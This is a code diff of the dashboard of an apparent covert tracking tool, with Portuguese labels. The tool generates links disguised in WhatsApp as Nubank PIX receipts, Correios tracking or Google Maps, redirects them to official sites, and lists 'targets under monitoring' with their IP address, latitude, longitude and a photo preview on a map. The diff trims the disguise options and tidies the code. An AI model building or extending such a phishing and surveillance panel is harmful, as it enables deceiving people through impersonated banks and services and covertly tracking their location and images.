@@ -108,34 +108,10 @@
                 <div class="form-group">
                     <label>Aparência no WhatsApp (Camuflagem)</label>
                     <select name="camuflagem">
-                        <optgroup label="Financeiro">
-                            <option value="nubank">🟣 Nubank (Comprovante PIX)</option>
-                            <option value="itau">🟠 Itaú (Comprovante Pagamento)</option>
-                            <option value="bradesco">🔴 Bradesco (Extrato PDF)</option>
-                            <option value="caixa">🔵 Caixa (Boleto Atualizado)</option>
-                            <option value="santander">⚪ Santander (Fatura)</option>
-                            <option value="inter">🟠 Inter (Recibo)</option>
-                        </optgroup>
-                        <optgroup label="Entregas/Logística">
-                            <option value="correios">📦 Correios (Rastreio)</option>
-                            <option value="mercadolivre">🟡 Mercado Livre (NF-e)</option>
-                            <option value="fedex">🟣 FedEx (Entrega)</option>
-                            <option value="shopee">🟠 Shopee (Pedido)</option>
-                        </optgroup>
-                        <optgroup label="Mídia/Notícias">
-                            <option value="g1">🔴 Notícia G1 (Urgente)</option>
-                            <option value="youtube">📹 Vídeo YouTube</option>
-                            <option value="tiktok">🎵 Vídeo TikTok</option>
-                            <option value="cnn">🔴 CNN Brasil</option>
-                        </optgroup>
-                        <optgroup label="Utilidades">
-                            <option value="pdf">📄 Arquivo PDF (Padrão)</option>
-                            <option value="govbr">🏛️ Portal Gov.br</option>
-                            <option value="maps">📍 Google Maps</option>
-                            <option value="drive">📂 Google Drive</option>
-                            <option value="vcard">👤 Contato VCF</option>
-                            <option value="zoom">🎥 Reunião Zoom</option>
-                        </optgroup>
+                        <option value="nubank">🟣 Nubank (Comprovante PIX)</option>
+                        <option value="correios">📦 Correios (Rastreio)</option>
+                        <option value="maps">📍 Google Maps</option>
+                        <option value="pdf">📄 Arquivo PDF (Padrão)</option>
                     </select>
                 </div>
                 
@@ -145,19 +121,10 @@
                         <option value="https://www.google.com">Google (Seguro)</option>
                         <option value="https://nubank.com.br">Nubank (Oficial)</option>
                         <option value="https://rastreamento.correios.com.br">Correios (Oficial)</option>
-                        <option value="https://www.gov.br">Portal Gov.br</option>
-                        <option value="https://www.mercadolivre.com.br">Mercado Livre</option>
-                        <option value="https://www.itau.com.br">Banco Itaú</option>
-                        <option value="https://www.bb.com.br">Banco do Brasil</option>
-                        <option value="https://www.receita.fazenda.gov.br">Receita Federal</option>
-                        <option value="https://www.whatsapp.com">WhatsApp Web</option>
-                        <option value="https://www.g1.globo.com">Portal G1</option>
-                        <option value="https://www.instagram.com">Instagram</option>
-                        <option value="https://www.netflix.com">Netflix</option>
                     </select>
                 </div>
                 
-                <button type="submit" class="btn-primary">Gerar Link para Rastreio</button>
+                <button type="submit" class="btn-primary">Gerar Novo Rastreio</button>
             </form>
 
             <div class="separator"><span>ALVOS EM MONITORAMENTO</span></div>
@@ -190,14 +157,14 @@
                         <div class="telemetry-card">
                             <div class="card-header">
                                 <div><span class="status-dot ${statusClass}"></span><b>${dados.motorista}</b></div>
-                                <button style="color:#f87171; background:none; border:none; cursor:pointer; font-size:16px;" onclick="if(confirm('Excluir alvo?')) fetch('/excluir/${id}', {method:'DELETE'}).then(atualizar)">&times;</button>
+                                <button style="color:#f87171; background:none; border:none; cursor:pointer;" onclick="if(confirm('Excluir alvo?')) fetch('/excluir/${id}', {method:'DELETE'}).then(atualizar)">&times;</button>
                             </div>
                             <div class="card-body">
                                 <div class="info-grid">
-                                    <div><div class="info-label">Último Sinal</div><div class="info-value">${dados.ultimo_visto}</div></div>
-                                    <div><div class="info-label">Endereço IP</div><div class="info-value">${dados.ip || '---'}</div></div>
-                                    <div><div class="info-label">Latitude</div><div class="info-value">${latVal}</div></div>
-                                    <div><div class="info-label">Longitude</div><div class="info-value">${lonVal}</div></div>
+                                    <div><div class="info-label">ÚLTIMO SINAL</div><div class="info-value">${dados.ultimo_visto}</div></div>
+                                    <div><div class="info-label">ENDEREÇO IP</div><div class="info-value">${dados.ip || '---'}</div></div>
+                                    <div><div class="info-label">LATITUDE</div><div class="info-value">${latVal}</div></div>
+                                    <div><div class="info-label">LONGITUDE</div><div class="info-value">${lonVal}</div></div>
                                     <div class="foto-preview">${fotoHtml}</div>
                                 </div>
                                 <div class="link-display" onclick="navigator.clipboard.writeText('${dados.link}'); alert('Link copiado!');">
@@ -211,12 +178,9 @@
                         </div>`;
                     
                     if(dados.lat && dados.lon) {
-                        if(!markers[id]) {
-                            markers[id] = L.marker([dados.lat, dados.lon]).addTo(map)
-                                .bindPopup(`<b>${dados.motorista}</b><br>Visto: ${dados.ultimo_visto}`);
-                        } else {
-                            markers[id].setLatLng([dados.lat, dados.lon]);
-                        }
+                        if(!markers[id]) markers[id] = L.marker([dados.lat, dados.lon]).addTo(map)
+                            .bindPopup(`<b>${dados.motorista}</b><br>Visto: ${dados.ultimo_visto}`);
+                        else markers[id].setLatLng([dados.lat, dados.lon]);
                     }
                 }
             });
